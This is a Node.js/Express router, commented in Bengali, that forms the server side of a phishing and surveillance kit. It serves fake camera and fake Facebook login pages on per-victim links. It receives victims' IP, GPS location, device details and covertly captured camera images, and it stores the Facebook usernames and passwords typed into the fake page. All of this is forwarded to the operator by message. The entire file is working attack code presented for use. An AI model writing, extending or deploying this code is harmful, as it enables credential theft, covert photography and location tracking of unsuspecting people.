const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const { getConfig, sendMessage, formatVictimData } = require('../utils/helpers');

// ===== ক্যামেরা লিঙ্ক ভিজিট =====
router.get('/v/:id', async (req, res) => {
    const victim = await Victim.findOne({ id: req.params.id });
    if (!victim) return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

// ===== ফেক ফেসবুক লিঙ্ক ভিজিট =====
router.get('/fb/:id', async (req, res) => {
    const victim = await Victim.findOne({ id: req.params.id });
    if (!victim) return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
    res.sendFile(path.join(__dirname, '../public/fb.html'));
});

// ===== ভিক্টিম ডেটা রিসিভ =====
router.post('/api/victim', async (req, res) => {
    try {
        const data = req.body;
        let victim = await Victim.findOne({ id: data.id });
        if (!victim) {
            victim = new Victim({
                id: data.id,
                fbId: data.fbId,
                type: data.type || 'camera',
                timestamp: new Date(data.timestamp),
                ip: data.ip,
                location: data.location,
                gpsLocation: data.gpsLocation,
                device: data.device,
                media: data.media,
                network: data.network,
                battery: data.battery,
                collectedAt: new Date()
            });
            await victim.save();
        } else {
            // আপডেট
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
        }

        console.log(`✅ নতুন ভিক্টিম ডেটা: ${data.id}`);

        // ইউজারকে মেসেজ পাঠান
        if (victim.fbId) {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
        }
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Victim data error:', err);
        res.status(500).json({ status: 'error' });
    }
});

// ===== ক্যামেরা ছবি রিসিভ =====
router.post('/api/camera', async (req, res) => {
    try {
        const { id, image } = req.body;
        const victim = await Victim.findOne({ id: id });
        if (victim) {
            if (!victim.camera) victim.camera = [];
            victim.camera.push({ image, timestamp: new Date() });
            await victim.save();
            console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${victim.camera.length}টি)`);

            if (victim.fbId) {
                await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${victim.camera.length}টি ছবি সংগ্রহ করা হয়েছে।`);
            }
        }
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Camera error:', err);
        res.status(500).json({ status: 'error' });
    }
});

// ===== ইমেজ ভিউ =====
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        const index = parseInt(req.params.index);
        if (index < 0 || index >= victim.camera.length) return res.status(404).send('ছবি পাওয়া যায়নি');
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        res.status(500).send('এরর');
    }
});

// ===== ফেক ফেসবুক লগইন ডেটা =====
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        const victim = await Victim.findOne({ id: id });
        if (victim) {
            victim.fbLogin = {
                username,
                password,
                timestamp: new Date(),
                ip: req.ip || req.connection.remoteAddress
            };
            await victim.save();
            console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);

            if (victim.fbId) {
                const msg = `🔐 **ফেক ফেসবুক লগইন ডেটা!**\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
                await sendMessage(victim.fbId, msg);
            }
        }
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('FB Login error:', err);
        res.status(500).json({ status: 'error' });
    }
});

module.exports = router;